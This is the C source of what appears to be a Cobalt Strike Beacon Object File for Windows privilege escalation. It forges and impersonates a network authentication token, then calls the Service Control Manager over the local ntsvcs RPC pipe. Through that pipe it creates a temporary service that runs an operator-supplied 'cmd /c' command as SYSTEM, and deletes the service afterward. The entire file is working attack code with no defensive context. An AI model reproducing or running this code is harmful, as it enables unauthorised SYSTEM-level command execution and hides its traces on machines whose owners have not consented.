#define SECURITY_WIN32
#include <windows.h>
#include <stdio.h>
#include "bofdefs.h"
#include "beacon.h"
#include "Token.c"
#include "Base.c"
#include "Rpc.c"

void go(char *args, int argc)
{

	if(!bofstart())
	{
		return;
	}

    datap Parser = {0};
    PSTR pstrCommand = {0};
    DWORD dwCommand = {0};
    BUFFER CurrentUser = {0};
    HANDLE hCurrentToken, hNetworkToken = NULL;
    PPRIVSLIST pPrivsList, pNetworkPrivsList = NULL;
    DWORD dwPrivsCount, dwNetworkPrivsCount = 0x00;

    BeaconDataParse(&Parser, args, argc);
    pstrCommand = BeaconDataExtract(&Parser, &dwCommand);
    internal_printf("[+] Command: %s\n", pstrCommand);
    

    hCurrentToken = TokenCurrentHandle();
    internal_printf("[+] Got Current Token: 0x%x\n", hCurrentToken);

    if(!TokenQueryOwner(hCurrentToken, &CurrentUser, TOKEN_OWNER_FLAG_DEFAULT)){
        BeaconPrintf(CALLBACK_ERROR, "[-] Can't Query Token User Owner !\n");
        return;
    }

    internal_printf("[+] Current User: %ls\n", CurrentUser.Buffer);
    if(!TokenQueryPrivs(hCurrentToken, &pPrivsList, &dwPrivsCount))
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] Can't Query Token User Privileges !\n");
        return;
    }

    internal_printf("\n%-30s%-30s\n", "Privilege Name", "State");
    internal_printf("============================= ===========================\n");

    /* Printf Token Information */
    for (int i = 0; i < dwPrivsCount; i++)
    {
        internal_printf("%-30s", pPrivsList[i].Name);
        if (pPrivsList[i].Flags & SE_PRIVILEGE_ENABLED)
            internal_printf("%-30s\n", "ENABLE");
        else
            internal_printf("%-30s\n", "DISABLE");
    }

    internal_printf("\n[*] Trying get Network Token\n");
    hNetworkToken = ForgeNetworkAuthToken();

    if (hNetworkToken == INVALID_HANDLE_VALUE){
        BeaconPrintf(CALLBACK_ERROR, "[-] Can't Get Network Token !\n");
        return;
    }
    internal_printf("[+] Got Network Token: 0x%x\n", hNetworkToken);

    if(!TokenQueryPrivs(hNetworkToken, &pNetworkPrivsList, &dwNetworkPrivsCount))
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] Can't Query Netwok Token Privileges !\n");
        return;
    }

    internal_printf("\n%-30s%-30s\n", "Privilege Name", "State");
    internal_printf("============================= ===========================\n");

    /* Printf Token Information */
    for (int i = 0; i < dwNetworkPrivsCount; i++)
    {
        internal_printf("%-30s", pNetworkPrivsList[i].Name);
        if (pNetworkPrivsList[i].Flags & SE_PRIVILEGE_ENABLED)
            internal_printf("%-30s\n", "ENABLE");
        else
            internal_printf("%-30s\n", "DISABLE");
    }
    ADVAPI32$ImpersonateLoggedOnUser(hNetworkToken);

    /* Run RPC Command */

	RpcConnectionStruct *RpcConnection = (RpcConnectionStruct*)MSVCRT$malloc(sizeof(RpcConnectionStruct));
	BYTE bServiceManagerObject[20];
	BYTE bServiceObject[20];
	DWORD dwReturnValue = 0;
	char szServiceName[256];
	DWORD dwServiceNameLength = 0;
	char szServiceCommandLine[256];
	DWORD dwServiceCommandLineLength = 0;

	// generate a temporary service name
	MSVCRT$memset(szServiceName, 0, sizeof(szServiceName));
	MSVCRT$_snprintf(szServiceName, sizeof(szServiceName) - 1, "CreateSvcRpc_%u", KERNEL32$GetTickCount());
	dwServiceNameLength = MSVCRT$strlen(szServiceName) + 1;

	// set service command line
	MSVCRT$memset(szServiceCommandLine, 0, sizeof(szServiceCommandLine));
	MSVCRT$_snprintf(szServiceCommandLine, sizeof(szServiceCommandLine) - 1, "cmd /c %s", pstrCommand);
	dwServiceCommandLineLength = MSVCRT$strlen(szServiceCommandLine) + 1;
	internal_printf("\n[*] Connecting to SVCCTL RPC pipe...\n");
   
    // Connect RPC
    char* szPipePath = "\\\\127.0.0.1\\pipe\\ntsvcs";
    char* pInterfaceUUID = "367abb81-9844-35f1-ad32-98f038001003";
    DWORD dwInterfaceVersion = 2;
    HANDLE hFile = NULL;

    hFile = KERNEL32$CreateFileA(szPipePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        BeaconPrintf(CALLBACK_ERROR, "Can't Create File!\n");
        return;
    }
    
    MSVCRT$memset((void*)RpcConnection, 0, sizeof(RpcConnectionStruct));
    RpcConnection->hFile = hFile;
    RpcConnection->dwCallIndex = 1;
    if (RpcBind(RpcConnection, pInterfaceUUID, 2) != 0)
    {
        BeaconPrintf(CALLBACK_ERROR, "can't RPC Bind!\n");
        return;
    }

	internal_printf("[*] Opening service manager...\n");

	// OpenSCManager
	RpcInitialiseRequestData(RpcConnection);
	RpcAppendRequestData_Dword(RpcConnection, 0);
	RpcAppendRequestData_Dword(RpcConnection, 0);
	RpcAppendRequestData_Dword(RpcConnection, SC_MANAGER_ALL_ACCESS);
	if(RpcSendRequest(RpcConnection, RPC_CMD_ID_OPEN_SC_MANAGER) != 0)
	{
		// error
		RpcDisconnect(RpcConnection);
        BeaconPrintf(CALLBACK_ERROR, "Send Return Error!\n");
		return;
	}

	// validate rpc output data length
	if(RpcConnection->dwProcedureOutputDataLength != RPC_OUTPUT_LENGTH_OPEN_SC_MANAGER)
	{
		// error
		RpcDisconnect(RpcConnection);
        BeaconPrintf(CALLBACK_ERROR, "Validate Rpc output Return Error!\n");
		return;
	}

	// get return value
	dwReturnValue = (DWORD)RpcConnection->bProcedureOutputData[20];

	// check return value
	if(dwReturnValue != 0)
	{
        BeaconPrintf(CALLBACK_ERROR, "Check Return Error!\n");
		RpcDisconnect(RpcConnection);
		return;
	}

	// store service manager object
	MSVCRT$memcpy(bServiceManagerObject, RpcConnection->bProcedureOutputData, sizeof(bServiceManagerObject));

	internal_printf("[*] Creating temporary service...\n");

	/* /1* // CreateService *1/ */
    RpcInitialiseRequestData(RpcConnection);
    RpcAppendRequestData_Binary(RpcConnection, bServiceManagerObject, sizeof(bServiceManagerObject));
    RpcAppendRequestData_Dword(RpcConnection, dwServiceNameLength);
    RpcAppendRequestData_Dword(RpcConnection, 0);
    RpcAppendRequestData_Dword(RpcConnection, dwServiceNameLength);
    RpcAppendRequestData_Binary(RpcConnection, (BYTE*)szServiceName, dwServiceNameLength);
    RpcAppendRequestData_Dword(RpcConnection, 0);
    RpcAppendRequestData_Dword(RpcConnection, SERVICE_ALL_ACCESS);
    RpcAppendRequestData_Dword(RpcConnection, SERVICE_WIN32_OWN_PROCESS);
    RpcAppendRequestData_Dword(RpcConnection, SERVICE_DEMAND_START);
    RpcAppendRequestData_Dword(RpcConnection, SERVICE_ERROR_IGNORE);
    RpcAppendRequestData_Dword(RpcConnection, dwServiceCommandLineLength);
    RpcAppendRequestData_Dword(RpcConnection, 0);
    RpcAppendRequestData_Dword(RpcConnection, dwServiceCommandLineLength);
    RpcAppendRequestData_Binary(RpcConnection, (BYTE*)szServiceCommandLine, dwServiceCommandLineLength);
    RpcAppendRequestData_Dword(RpcConnection, 0);
    RpcAppendRequestData_Dword(RpcConnection, 0);
    RpcAppendRequestData_Dword(RpcConnection, 0);
    RpcAppendRequestData_Dword(RpcConnection, 0);
    RpcAppendRequestData_Dword(RpcConnection, 0);
    RpcAppendRequestData_Dword(RpcConnection, 0);
    RpcAppendRequestData_Dword(RpcConnection, 0);
	if(RpcSendRequest(RpcConnection, RPC_CMD_ID_CREATE_SERVICE) != 0)
	{
		// error
		RpcDisconnect(RpcConnection);

		BeaconPrintf(CALLBACK_ERROR,"Rpc Send error");
		return;
	}

	// validate rpc output data length
    if (RpcConnection->dwProcedureOutputDataLength != RPC_OUTPUT_LENGTH_CREATE_SERVICE)
	{
		// error
		RpcDisconnect(RpcConnection);

		BeaconPrintf(CALLBACK_ERROR,"validate RPC output error");
		return;
	}

	// get return value
    dwReturnValue = (DWORD)RpcConnection->bProcedureOutputData[24];

    // check return value
    if (dwReturnValue != 0)
    {
        BeaconPrintf(CALLBACK_ERROR, "CreateService error: %u\n", dwReturnValue);

        // error
        RpcDisconnect(RpcConnection);
        MSVCRT$free(RpcConnection);
        return;
    }

	// store service object
    MSVCRT$memcpy(bServiceObject, &(RpcConnection->bProcedureOutputData[4]), sizeof(bServiceObject));
    internal_printf("[+] Execute '%s' as SYSTEM user...\n", pstrCommand);

	// StartService
    RpcInitialiseRequestData(RpcConnection);
    RpcAppendRequestData_Binary(RpcConnection, bServiceObject, sizeof(bServiceObject));
    RpcAppendRequestData_Dword(RpcConnection, 0);
    RpcAppendRequestData_Dword(RpcConnection, 0);
	if(RpcSendRequest(RpcConnection, RPC_CMD_ID_START_SERVICE) != 0)
	{
		// error
		RpcDisconnect(RpcConnection);

		BeaconPrintf(CALLBACK_ERROR,"Send Request error");
		return;
	}

	// validate rpc output data length
	if(RpcConnection->dwProcedureOutputDataLength != RPC_OUTPUT_LENGTH_START_SERVICE)
	{
		// error
		RpcDisconnect(RpcConnection);

		BeaconPrintf(CALLBACK_ERROR,"Validate error");
		return;
	}

	// get return value
    dwReturnValue = (DWORD)RpcConnection->bProcedureOutputData[0];

	// check return value
	if(dwReturnValue != 0 && dwReturnValue != ERROR_SERVICE_REQUEST_TIMEOUT)
	{
		/* BeaconPrintf(CALLBACK_ERROR,"Check Return Value error"); */
		/* // error */
		/* RpcDisconnect(RpcConnection); */
		/* return; */
	}

	internal_printf("[*] Deleting temporary service...\n");

	// DeleteService
    RpcInitialiseRequestData(RpcConnection);
    RpcAppendRequestData_Binary(RpcConnection, bServiceObject, sizeof(bServiceObject));
    if (RpcSendRequest(RpcConnection, RPC_CMD_ID_DELETE_SERVICE) != 0)
	{
		// error
		RpcDisconnect(RpcConnection);
        BeaconPrintf(CALLBACK_ERROR, "DeleteService Error!\n");
		return;
	}

	// validate rpc output data length
    if (RpcConnection->dwProcedureOutputDataLength != RPC_OUTPUT_LENGTH_DELETE_SERVICE)
    {
        // error
        RpcDisconnect(RpcConnection);
        MSVCRT$free(RpcConnection);
        return;
    }

	// get return value
    dwReturnValue = (DWORD)RpcConnection->bProcedureOutputData[0];

	// check return value
	if(dwReturnValue != 0)
	{
        BeaconPrintf(CALLBACK_ERROR, "Validate Rpc Output Data Error!\n");

		RpcDisconnect(RpcConnection);

		return;
	}

	internal_printf("[+] Finished\n");

	// disconnect from rpc pipe
	if(RpcDisconnect(RpcConnection) != 0)
	{
		return;
	}

    printoutput(TRUE);

}
